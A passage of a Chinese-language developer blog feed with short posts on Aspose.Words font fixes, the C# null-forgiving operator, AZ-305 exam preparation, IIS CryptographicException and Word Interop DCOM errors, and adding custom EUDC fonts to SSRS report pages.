YaHei</strong>」 。<br>所以建立一個 HandleNodeChangingFontChanger Class 來實作 INodeChangingCallback 介面，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HandleNodeChangingFontChanger</span> : <span class="title">INodeChangingCallback</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 預設為標楷體</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">string</span> _fontName = <span class="string">"DFKai-SB"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HandleNodeChangingFontChanger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HandleNodeChangingFontChanger</span>(<span class="params"><span class="keyword">string</span> fontName</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _fontName = fontName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> INodeChangingCallback.NodeInserted(NodeChangingArgs args)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.Node.NodeType == NodeType.Run)</span><br><span class="line">        &#123;</span><br><span class="line">            Aspose.Words.Font font = ((Run)args.Node).Font;</span><br><span class="line">            font.Name = _fontName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> INodeChangingCallback.NodeInserting(NodeChangingArgs args)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> INodeChangingCallback.NodeRemoved(NodeChangingArgs args)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> INodeChangingCallback.NodeRemoving(NodeChangingArgs args)</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再來就是設定 doc 的 NodeChangingCallback 屬性為上面建立的 HandleNodeChangingFontChanger Class，並設定要更改的字型為 「<strong>Microsoft YaHei</strong>」</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docxPath = <span class="string">@"c:\temp\h2docx.docx"</span>;</span><br><span class="line"><span class="keyword">var</span> pdfPath = <span class="string">@"c:\temp\h2pdf.pdf"</span>;</span><br><span class="line"><span class="keyword">var</span> doc = <span class="keyword">new</span> Aspose.Words.Document();</span><br><span class="line"><span class="keyword">var</span> fontName = <span class="string">"Microsoft YaHei"</span>;</span><br><span class="line">doc.NodeChangingCallback = <span class="keyword">new</span> HandleNodeChangingFontChanger(fontName);</span><br><span class="line"><span class="keyword">var</span> docBuilder = <span class="keyword">new</span> Aspose.Words.DocumentBuilder(doc);</span><br><span class="line"><span class="keyword">var</span> html = <span class="string">@"&lt;div&gt;U+2FA6(⾦) vs U+91D1(金)&lt;/div&gt;"</span>;</span><br><span class="line">docBuilder.InsertHtml(html);</span><br><span class="line">doc.Save(docxPath);</span><br><span class="line">doc.Save(pdfPath);</span><br></pre></td></tr></table></figure><p>執行程式後可以發現 Word 中的字型已變成了 「<strong>Microsoft YaHei</strong>」 字型，<br>而在 PDF 中的 <strong>U+2FA6(⾦)</strong> 這個字，也可以正常顯示了。</p><img src="/2022/11/15/aspose-kangxi-radical-html-pdf-square-box/02.png" title="square box in pdf"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://unicode-table.com/en/2FA6/" target="_blank" rel="noopener">U+2FA6(⾦)</a><br><a href="https://www.fileformat.info/info/unicode/font/dfkai-sb/list.htm" target="_blank" rel="noopener">標楷體支援的 Unicode</a><br><a href="https://reference.aspose.com/words/net/aspose.words/inodechangingcallback/nodeinserted/" target="_blank" rel="noopener">INodeChangingCallback.NodeInserted method</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;有些情況在透過 Aspose.Words 另存成 PDF 檔後，&lt;br&gt;有些字在 PDF 中會變成 空白框(square box) 或是變成
      
    
    </summary>
    
    
      <category term="PDF" scheme="https://rainmakerho.github.io/tags/PDF/"/>
    
      <category term="Aspose" scheme="https://rainmakerho.github.io/tags/Aspose/"/>
    
      <category term="Word" scheme="https://rainmakerho.github.io/tags/Word/"/>
    
      <category term="空白框" scheme="https://rainmakerho.github.io/tags/%E7%A9%BA%E7%99%BD%E6%A1%86/"/>
    
      <category term="square box" scheme="https://rainmakerho.github.io/tags/square-box/"/>
    
      <category term="kangxi radical" scheme="https://rainmakerho.github.io/tags/kangxi-radical/"/>
    
      <category term="unicode" scheme="https://rainmakerho.github.io/tags/unicode/"/>
    
  </entry>
  
  <entry>
    <title>C# 使用 non-null 的運算子</title>
    <link href="https://rainmakerho.github.io/2022/11/10/non-null-assertion-operator-syntax/"/>
    <id>https://rainmakerho.github.io/2022/11/10/non-null-assertion-operator-syntax/</id>
    <published>2022-11-10T09:16:39.000Z</published>
    <updated>2022-11-10T09:46:23.805Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在寫 C# 時，有些關於 Null 的一些警告內容為 <strong>CS8600</strong> 或是 <strong>CS8602</strong> ，如下，<br>CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。<br>CS8602 // 可能 null 參考的取值 (dereference)。<br>從這些警告來看，筆著想到一個問題，<br>通常怕物件為 null ，怕會有 <strong>NullReferenceException</strong> 通常都會加上 <strong>?</strong> ，<br>那如果確定該物件不為 null 要加上什麼呢?</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>先回到 <strong>CS8600</strong> 或是 <strong>CS8602</strong> 的警告問題，<br>如果要讓警告消失的話，可以在程式碼的下、下去加入 <strong>停用</strong> CS8600 或是 CS8602 的標註，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">string</span> jsonString = <span class="string">@"&#123;""FirstName"":""RM"", ""LastName"":""Ho""&#125;"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。</span></span><br><span class="line"><span class="keyword">dynamic</span> customer2 = JsonSerializer.Deserialize&lt;ExpandoObject&gt;(jsonString);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS8600 // 正在將 Null 常值或可能的 Null 值轉換為不可為 Null 的型別。</span></span><br></pre></td></tr></table></figure><p>或是</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Foo</span>(<span class="params"><span class="keyword">string</span>? argument</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS8602 // 可能 null 參考的取值 (dereference)。</span></span><br><span class="line">    <span class="keyword">var</span> l = argument.Length;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS8602 // 可能 null 參考的取值 (dereference)。</span></span><br><span class="line">    <span class="keyword">var</span> l1 = argument?.Length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>當然，警告就是要讓開發人員去檢視是否真的會有 null 的問題，<br>所以相信很少人會真的去加 <strong>#pragma warning disable</strong> 。<br>那如果它真的不會是 null 在 C# 要加上什麼呢?<br>答案就是 <strong>!</strong> ，跟 TypeScript 一樣，都是 <strong>!</strong>，如下，</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">string</span> jsonString = <span class="string">@"&#123;""FirstName"":""RM"", ""LastName"":""Ho""&#125;"</span>;</span><br><span class="line"><span class="keyword">dynamic</span> customer2 = JsonSerializer.Deserialize&lt;ExpandoObject&gt;(jsonString)!;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Foo</span>(<span class="params"><span class="keyword">string</span>? argument</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> l = argument!.Length;</span><br><span class="line">    <span class="keyword">var</span> l1 = argument?.Length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://learntypescript.dev/07/l2-non-null-assertion-operator" target="_blank" rel="noopener">Using the non-null assertion operator</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在寫 C# 時，有些關於 Null 的一些警告內容為 &lt;strong&gt;CS8600&lt;/strong&gt; 或是 &lt;strong&gt;CS8602&lt;/
      
    
    </summary>
    
    
      <category term="C#" scheme="https://rainmakerho.github.io/tags/C/"/>
    
      <category term="NullReferenceException" scheme="https://rainmakerho.github.io/tags/NullReferenceException/"/>
    
      <category term="non-null" scheme="https://rainmakerho.github.io/tags/non-null/"/>
    
      <category term="!" scheme="https://rainmakerho.github.io/tags//"/>
    
      <category term="CS8602" scheme="https://rainmakerho.github.io/tags/CS8602/"/>
    
      <category term="CS8600" scheme="https://rainmakerho.github.io/tags/CS8600/"/>
    
  </entry>
  
  <entry>
    <title>AZ-305 考試經驗分享</title>
    <link href="https://rainmakerho.github.io/2022/11/09/az305/"/>
    <id>https://rainmakerho.github.io/2022/11/09/az305/</id>
    <published>2022-11-09T02:54:59.000Z</published>
    <updated>2022-11-09T08:21:42.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>到 <a href="https://www.uuu.com.tw/default.aspx" target="_blank" rel="noopener">恆逸</a> 上完 <a href="https://learn.microsoft.com/zh-tw/certifications/exams/az-305" target="_blank" rel="noopener">設計 Microsoft Azure 基礎結構解決方案</a> 課程之後，自然就是要透過考試來加強學習的成效。<br>上課老師說過，考試的題目範圍並不限於教材內容。<br>那要如何準備考試呢?</p><h3 id="準備考試"><a href="#準備考試" class="headerlink" title="準備考試"></a>準備考試</h3><h4 id="刷題"><a href="#刷題" class="headerlink" title="刷題"></a>刷題</h4><p>大家可能都是到 <a href="https://www.examtopics.com/exams/microsoft/az-305/" target="_blank" rel="noopener">examtopics.com - AZ305</a> 來練習看看。<br>裡面有很多的題目可以練習，也可以看到針對同個題目，不同的見解，也會有許多的參考資料，<br>可以讓自已對 Azure 的運作又更熟悉了一些。<br>另外，因為大多數的練習網站免費的使用者，大多只會提供一些 Demo 題目，或是一半的題目。<br>所以這時的策略就是參考其他的網站，如下，<br>以下將這些題目的網站</p><ul><li><a href="https://www.examtopics.com/exams/microsoft/az-305/" target="_blank" rel="noopener">examtopics.com - AZ305</a></li><li><a href="https://www.certlibrary.com/exam/AZ-305" target="_blank" rel="noopener">certlibrary.com - AZ305</a></li><li><a href="https://www.itfreedumps.com/2022-new-updated-microsoft-az-305-exam-questions/" target="_blank" rel="noopener">itfreedumps.com - AZ305</a></li></ul><h4 id="看影片"><a href="#看影片" class="headerlink" title="看影片"></a>看影片</h4><p>另外在 youtube 上面也有人針對很多題目來講解，</p><ul><li><p><a href="https://www.youtube.com/watch?v=bf1w5UOdUI8" target="_blank" rel="noopener">AZ-305 Real Exam Questions Series</a>，由 <a href="https://www.youtube.com/c/DbSkyLimit" target="_blank" rel="noopener">DbSkyLimit</a> 所發佈，有 8 部影片，包含 120 個題目說明。</p></li><li><p><a href="https://www.youtube.com/watch?v=JbEnkyswof0" target="_blank" rel="noopener">AZ-305 Designing Microsoft Azure Infrastructure Solutions Real Exam Q&amp;A 2022</a> 裡面有 40 個題目說明。</p></li></ul><p>以上參考的資料，希望對大家有所幫助。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;到 &lt;a href=&quot;https://www.uuu.com.tw/default.aspx&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="AZ305" scheme="https://rainmakerho.github.io/tags/AZ305/"/>
    
      <category term="AZ-305" scheme="https://rainmakerho.github.io/tags/AZ-305/"/>
    
      <category term="Exam AZ-305" scheme="https://rainmakerho.github.io/tags/Exam-AZ-305/"/>
    
  </entry>
  
  <entry>
    <title>System.Security.Cryptography.CryptographicException - The system cannot find the file specified.</title>
    <link href="https://rainmakerho.github.io/2022/11/04/CryptographicException-the-system-cannot-find-the-file-specified/"/>
    <id>https://rainmakerho.github.io/2022/11/04/CryptographicException-the-system-cannot-find-the-file-specified/</id>
    <published>2022-11-04T07:37:24.000Z</published>
    <updated>2022-11-04T07:47:15.280Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近同事詢問在 開發環境跑沒問題，一放到 Server 上程式就 GG 了。<br>將程式加上 log 來顯示，結果出現 <strong>System.Security.Cryptography.CryptographicException: The system cannot find the file specified.</strong> 的錯誤</p><blockquote><p>System.Security.Cryptography.CryptographicException: The system cannot find the file specified.<br>at System.Security.Cryptography.CryptographicException.ThrowCryptographicException(Int32 hr)<br>at System.Security.Cryptography.Utils.<em>CreateCSP(CspParameters param, Boolean randomKeyContainer, SafeProvHandle&amp; hProv)<br>at System.Security.Cryptography.Utils.CreateProvHandle(CspParameters parameters, Boolean randomKeyContainer)<br>at System.Security.Cryptography.Utils.GetKeyPairHelper(CspAlgorithmType keyType, CspParameters parameters, Boolean randomKeyContainer, Int32 dwKeySize, SafeProvHandle&amp; safeProvHandle, SafeKeyHandle&amp; safeKeyHandle)<br>at System.Security.Cryptography.RSACryptoServiceProvider.GetKeyPair()<br>at System.Security.Cryptography.RSACryptoServiceProvider..ctor(Int32 dwKeySize, CspParameters parameters, Boolean useDefaultKeySize)<br>at Org.BouncyCastle.Security.DotNetUtilities.CreateRSAProvider(RSAParameters rp) in /</em>/crypto/src/security/DotNetUtilities.cs:line 247<br>at Org.BouncyCastle.Security.DotNetUtilities.ToRSA(RsaKeyParameters rsaKey) in /_/crypto/src/security/DotNetUtilities.cs:line 158</p></blockquote><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>參考 <a href="https://stackoverflow.com/questions/17840825/cryptographicexception-was-unhandled-system-cannot-find-the-specified-file" target="_blank" rel="noopener">CryptographicException was unhandled: System cannot find the specified file</a> ，<br>因為 IIS 中的 Application Pool 進階設定中的 <strong>載入使用者設定檔(Load User Profile)</strong> 屬性預設是 false 。<br>所以程式中無法判別，所以只要將 <strong>載入使用者設定檔(Load User Profile)</strong> 屬性設定成 <strong>true</strong> 就可以了哦!</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://stackoverflow.com/questions/17840825/cryptographicexception-was-unhandled-system-cannot-find-the-specified-file" target="_blank" rel="noopener">CryptographicException was unhandled: System cannot find the specified file</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近同事詢問在 開發環境跑沒問題，一放到 Server 上程式就 GG 了。&lt;br&gt;將程式加上 log 來顯示，結果出現 &lt;strong&gt;S
      
    
    </summary>
    
    
      <category term="CryptographicException" scheme="https://rainmakerho.github.io/tags/CryptographicException/"/>
    
      <category term="BouncyCastle.Security" scheme="https://rainmakerho.github.io/tags/BouncyCastle-Security/"/>
    
      <category term="The system cannot find the file specified" scheme="https://rainmakerho.github.io/tags/The-system-cannot-find-the-file-specified/"/>
    
  </entry>
  
  <entry>
    <title>ASP.NET 使用 Interop.Word 會發生 0x80080005 (CO_E_SERVER_EXEC_FAILURE) 錯誤</title>
    <link href="https://rainmakerho.github.io/2022/11/02/co-e-server-exec-failure-80080005-office-word/"/>
    <id>https://rainmakerho.github.io/2022/11/02/co-e-server-exec-failure-80080005-office-word/</id>
    <published>2022-11-02T02:54:05.000Z</published>
    <updated>2022-11-02T03:15:56.381Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近同事詢問使用 Microsoft.Office.Interop.Word 元件處理檔案的問題。<br>一開始可以正常開啟檔案，操作做幾次後，就會卡卡的，最後就會噴 <strong>HRESULT:0x80080005 (CO_E_SERVER_EXEC_FAILURE)</strong> 的錯誤。</p><h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><p>一開始可以開啟檔案，操作做幾次後就有問題，感覺最後有可能 Word.Exe 沒有正常被關掉。<br>詢問同事後，證實在工作管理員中，有一堆的 Word.Exe 並未被正常關閉。<br>這通常是因為 Word 檔有些動作需要與人互動，<br>而我們使用程式去操作 Word.Application 時，通常會將 Visible 設定成 false ，<br>所以導致 Word.Exe 卡住而無法關閉。</p><p>於是查看同事的程式碼，發現程式中，並未設定 <strong>DisplayAlerts</strong> 屬性為 <strong>false</strong> ，<br>這更加讓我確定應該是有些 Alert 訊息卡在執行緒之中。</p><p>於是請同事在建立 Word.Application 後，<br>設定 DisplayAlerts 屬性設定為 fasle，Visible 屬性設定為 true，<br>再請同事在 Microsoft Office Word 的 DCOM 設定，在「識別身分」Tab 中，<br>先設定為 <strong>互動式使用者</strong> ，<br>執行程式看看 Word 是否有正常的顯示出來，並在最後順利關閉 Word.Exe。<br>如果沒問題的話，再將 Visible 設定成 false，<br>在 Microsoft Office Word 的 DCOM 設定，在「識別身分」Tab 中，設定為某個帳號，<br>再測試看看。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://dotblogs.com.tw/rainmaker/2012/02/29/70401" target="_blank" rel="noopener">Microsoft Office Excel 無法決定用資料範圍中那一列作為欄名稱</a><br><a href="https://dotblogs.com.tw/rainmaker/2009/10/14/11054" target="_blank" rel="noopener">解決 Win2008 Asp.NET 使用 Word.Selection 會有 System.NullReferenceException 的問題</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近同事詢問使用 Microsoft.Office.Interop.Word 元件處理檔案的問題。&lt;br&gt;一開始可以正常開啟檔案，操作做幾次
      
    
    </summary>
    
    
      <category term="Word" scheme="https://rainmakerho.github.io/tags/Word/"/>
    
      <category term="Office" scheme="https://rainmakerho.github.io/tags/Office/"/>
    
      <category term="0x80080005" scheme="https://rainmakerho.github.io/tags/0x80080005/"/>
    
      <category term="CO_E_SERVER_EXEC_FAILURE" scheme="https://rainmakerho.github.io/tags/CO-E-SERVER-EXEC-FAILURE/"/>
    
      <category term="Application.Documents.open()" scheme="https://rainmakerho.github.io/tags/Application-Documents-open/"/>
    
  </entry>
  
  <entry>
    <title>為 SQL Server Reporting Services (SSRS) Preview 報表加上自造字(EUDC Font) Support</title>
    <link href="https://rainmakerho.github.io/2022/10/28/ms-reporting-service-add-custom-font-woff-ttf/"/>
    <id>https://rainmakerho.github.io/2022/10/28/ms-reporting-service-add-custom-font-woff-ttf/</id>
    <published>2022-10-28T07:24:46.000Z</published>
    <updated>2022-10-28T08:23:20.990Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近客戶要在 Chrome 上開啟 Reporting Services 的報表，<br>但因為客戶的資料裡面有自造字(EUDC)，<br>所以會呈現一個空白框框。<br>於是在 SSRS 的目錄中，放入透過 fontforge 將 tte 轉成的 woff 及 ttf 檔，<br>將 Style 加入到 ReportViewer.aspx 之中，<br>結果還是無法呈現。</p><h3 id="原本做法"><a href="#原本做法" class="headerlink" title="原本做法"></a>原本做法</h3><p>1.將 使用者自造字(EUDC) 轉成 woff 及 ttf ，請參考 <a href="https://dotblogs.com.tw/rainmaker/2016/03/09/232711" target="_blank" rel="noopener">Font-讓瀏覽器顯示使用者自造字(EUDC)的方式</a></p><p>2.在 C:\Program Files\Microsoft SQL Server\MSRSxx.MSSQLSERVER\Reporting Services\ReportServer\Pages 目錄中，建立 fonts 目錄，並將 woff 及 ttf 檔案放到該目錄之中。(xx 是 MS SQL 版本號)</p><p>3.修改 C:\Program Files\Microsoft SQL Server\MSRSxx.MSSQLSERVER\Reporting Services\ReportServer\Pages\ReportViewer.aspx，在最後面加上 font css style。如下，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">Register</span> <span class="attr">TagPrefix</span>=<span class="string">"RS"</span> <span class="attr">Namespace</span>=<span class="string">"Microsoft.ReportingServices.WebServer"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Assembly</span>=<span class="string">"ReportingServicesWebServer"</span> %&gt;</span> <span class="tag">&lt;<span class="name">%@</span> <span class="attr">Page</span> <span class="attr">Language</span>=<span class="string">"C#"</span></span></span><br><span class="line"><span class="tag"><span class="attr">AutoEventWireup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Inherits</span>=<span class="string">"Microsoft.ReportingServices.WebServer.ReportViewerPage"</span></span></span><br><span class="line"><span class="tag"><span class="attr">EnableEventValidation</span>=<span class="string">"false"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asp:literal</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"docType"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:literal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">id</span>=<span class="string">"headID"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:literal</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"httpEquiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:literal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">GetPageTitle</span>() %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"margin: 0px; overflow: auto"</span> <span class="attr">f</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"ReportViewerForm"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">asp:ScriptManager</span></span></span><br><span class="line"><span class="tag">        <span class="attr">ID</span>=<span class="string">"AjaxScriptManager"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">AsyncPostBackTimeout</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">runat</span>=<span class="string">"server"</span></span></span><br><span class="line"><span class="tag">      /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">RS:ReportViewerHost</span> <span class="attr">ID</span>=<span class="string">"ReportViewerControl"</span> <span class="attr">runat</span>=<span class="string">"server"</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      Sys.WebForms.PageRequestManager.prototype._destroyTree = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span></span><br><span class="line"><span class="undefined">        element</span></span><br><span class="line"><span class="undefined">      ) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allnodes = element.getElementsByTagName(<span class="string">"*"</span>),</span></span><br><span class="line"><span class="undefined">          length = allnodes.length;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nodes = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; length; k++) &#123;</span></span><br><span class="line"><span class="undefined">          nodes[k] = allnodes[k];</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, l = nodes.length; j &lt; l; j++) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> node = nodes[j];</span></span><br><span class="line"><span class="javascript">          <span 